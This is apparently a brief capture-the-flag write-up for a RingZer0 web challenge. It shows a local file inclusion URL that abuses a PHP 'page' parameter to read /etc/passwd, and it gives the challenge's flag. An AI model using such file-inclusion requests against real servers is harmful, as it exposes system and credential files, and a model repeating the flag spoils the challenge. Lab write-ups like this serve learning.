#####[Looking for password file](http://ringzer0team.com/challenges/75)
#####Answer
The link say that the php page open files that gives to `page` variable. So we simply use the link bellow instead and read `passwd` file:
```
http://web.ringzer0team.com:13371/index.php?page=/etc/passwd
```
And in the `/etc/passwd` file we can see the flag `FLAG-zH9g1934v774Y7Zx5s16t5ym8Z`.

So we can drink our coffee after submitting the flag. :D
